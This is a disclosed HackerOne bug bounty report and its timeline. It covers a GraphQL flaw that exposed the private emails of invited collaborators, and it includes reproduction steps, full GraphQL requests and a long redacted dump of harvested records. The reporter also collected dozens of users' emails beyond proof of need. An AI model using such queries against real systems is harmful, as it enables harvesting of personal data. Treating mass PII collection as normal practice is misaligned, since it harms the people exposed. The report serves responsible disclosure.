---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/information-disclosure
  - env/web
  - trigger/low-priv-user
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2023-07-04
submitted: 2023-06-20T20:03:46.070Z
bounty_usd: 12500
votes: 429
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "0xrayan1996"
source: "https://hackerone.com/reports/2032716"
title: "An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name "
---
# An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name 

> **Severity:** High | **Bounty:** 12,500 USD | **Votes:** 429 | **Program:** HackerOne | **Disclosed:** 2023-07-04

- Report: [https://hackerone.com/reports/2032716](https://hackerone.com/reports/2032716)
- CWE: Information Disclosure
- Submitted: 2023-06-20T20:03:46.070Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**

An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their private email.
 
**Description:**

### Steps To Reproduce

1 - Create a dummy report and send it
2 - Add a hacker that you want to disclose his email  , Max is only 2 invites per report
3 - send the invite after sending the invite the hacker will be pending status until accept the report .
4- Go the pen on the right for adding more collaborator and click on the pen and capture traffic , you will see the user email in first request,
even that the user not accept the invitation yet  

HTTP Request : 
```
POST /graphql HTTP/2
Host: hackerone.com

[sinp]

{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n  saveCollaborators(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

````

Example :

Here is email for todayisnew , Hacker 1 rank in H1 :

```
████████

```


Video PoC :

████████

## Impact

An attacker can view any user's email registered with Hackerone as hacker .

## Timeline

- **Report Filed**
- **2023-06-21** @0xrayan1996: Hi HackerOne ,

In order to increase the impact have got many emails for users, I can dump all hackerone email users if you want :

Below PoC  and ``` user.txt```  is the file used, I stop doing this activity, here is the report used for the test: #2032701
 
         
      ```


{
  "data": {
    "report": {
      "report_collaborators": {
        "total_count": 2,
        "edges": [
          {
            "node": {
              "id": "redacted",
              "user": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "bounty_weight": 1,
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "user": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "bounty_weight": 1,
              "__typename": "redacted"
            },
            "__typename": "redacted"
          }
        ],
        "__typename": "redacted"
      },
      "report_collaborator_invitations": {
        "total_count": 61,
        "edges": [
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          }
        ],
        "__typename": "redacted"
      },
      "__typename": "redacted"
    }
  }
}



```██████
- **2023-06-21** @0xrayan1996: I think this should be High because the attacker can dump all ``` Hackerone Users ``` using an automated Python script above proving that is enough to show the impact. 


Need your attention to fix it as soon as possible
- **2023-06-21** @0xrayan1996: Final PoC summarizes the report  and the impact :

█████
- **2023-06-21** @0xrayan1996: Dear HackerOne team ,

Need your attention for this High bug to be patched as soon as possible.

Same case as the below 

https://hackerone.com/reports/792927
- **2023-06-21** @0xrayan1996: @z0x01  @h1_analyst_aaron
- **2023-06-21** @0xrayan1996: Great news,

It seems that we no more can send collaborate invites. 

{F2433176}
- **2023-06-21** @0xrayan1996: Is there any update on the status of the report ?
- **2023-06-21** @0xrayan1996: As per my understanding any high reports disclose such information you acting fast for the report , I don’t get the same in this report , @jobert FYI
- **2023-06-21** @0xrayan1996: @Hi ,

It seems to be a fix done, not able to grab emails, how did you do the fix without triaging the person who report the issue, sorry again but the fix was done after my report. it's not fair sorry for this word but I felt my report and effort are gone !!! 

{F2433927}
- **Report Pending Program Review**
- **2023-06-22** @0xrayan1996: Dear @h1_analyst_charlie 

Good Morning to you.

It seems to be, I'm unable to retrieve the user's email in my test report #2032701 using the below graphql query 

```

{"operationName":"ReportCollaboratorQuery","variables":{"reportId":2032701},"query":"query ReportCollaboratorQuery($reportId: Int!) {\n  report(id: $reportId) {\n    report_collaborators {\n      total_count\n      edges {\n        node {\n          id\n          user {\n            id\n            username\n            __typename\n          }\n          bounty_weight\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    report_collaborator_invitations {\n      total_count\n      edges {\n        node {\n          id\n          state\n          email\n          bounty_weight\n          recipient {\n            id\n            username\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

```

{F2436896}


Also, you removed the new collaborator design and back to the old style which fixed the issue completely. 

{F2436895}

In the previous fix, I was able to query to  ```/ReportCollaboratorQuery ``` and retrieve the user's email that was invited already but I can't invite any more.

Now 



Regards,
RO
- **2023-06-28** @0xrayan1996: @h1_analyst_charlie Hi H1 team ,

Would you kindly give me an update ?
- **Report Triaged**
- **Bounty Awarded**
- **Report Retesting**
- **2023-06-29** @0xrayan1996: @eggscute Thank you for the bounty ,

I think this report and #2032666 are high severity and should be awarded with High not medium.

Below a report same as my case , I was able to dump all H1 emails .

https://hackerone.com/reports/792927
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-06-29** @0xhsn_h1: We marked the other report as a duplicate of this one, as both share the same root cause and impact. Thank you.
- **User Completed Retest**
- **2023-06-29** @0xrayan1996: @eggscute 

If this will go public can you delete the first Video or mute the music ): 

██████████
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **2023-07-03** @0xrayan1996: Good morning @eggscute 

Is it possible to send me a T-shirt  or hoodie? As per my understanding, you send swag for ``` High ``` bug.

Regards,
RO
- **2023-07-04** @zerotea: Hi @0xrayan1996 - I'll ask the swag team if this is something we send swag for, I'm not entirely sure. Will post back once I know more :)
- **2023-07-04** @zerotea: >Can we disclose this report ? But make sure to hide users email in the report .

We're working on making this happen! unfortunately there's some technical limitations in our redaction mechanisms so we'll need to engineer a way to redact all emails properly. In the future it would be helpful if you could only post some of the PII (i.e. limit to 3 results) to make this process slightly easier and faster :)
- **2023-07-04** @0xrayan1996: @zerotea 

Sure , kindly comment the follow up comments as well as this might not be valuable for the reader ):
.

```
   "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
          {
            "node": {
              "id": "redacted",
              "state": "redacted",
              "email": "redacted",
              "bounty_weight": 1,
              "recipient": {
                "id": "redacted",
                "username": "redacted",
                "__typename": "redacted"
              },
              "__typename": "redacted"
            },
            "__typename": "redacted"
          },
```
- **2023-07-04** @zerotea: Hi - I manually ran a script that performs `data.gsub(/("[^ ]+":) "[^ ]+"/, '\1 "redacted"')` on your comments (ID 22637505 & 22438317) 

Could you confirm all PII is private and redacted now to doubly check it's OK to disclose?
- **2023-07-04** @0xrayan1996: @zerotea Hi 

impressive work, Yes the PII is redacted now, we can disclose it. 

Regards,
RO
- **Agreed On Going Public**
- **Report Became Public**
- **2023-07-06** @zerotea: We are aware that Hacker PII (at least email) was accessed by the hacker, and are working on identifying the number affected users (accessed by this hacker, but also if other people have exploited this before) and subsequently informing them. I would like to apologize personally for not executing with excellence here, and I should have taken more care to ring alarm bells sooner to get this news to you faster (rather than through a disclosed report).

This is still an ongoing process and we will report back once we have more information.
- **2023-07-07** @zerotea: Status update: We have sent out an email to all affected accounts around 17:15 UTC.
- **2023-07-07** @zerotea: Update: only a small subset of these email addresses were viewed by the hacker that submitted the vulnerability, but we wanted to make all impacted users aware.
- **Bounty Awarded**
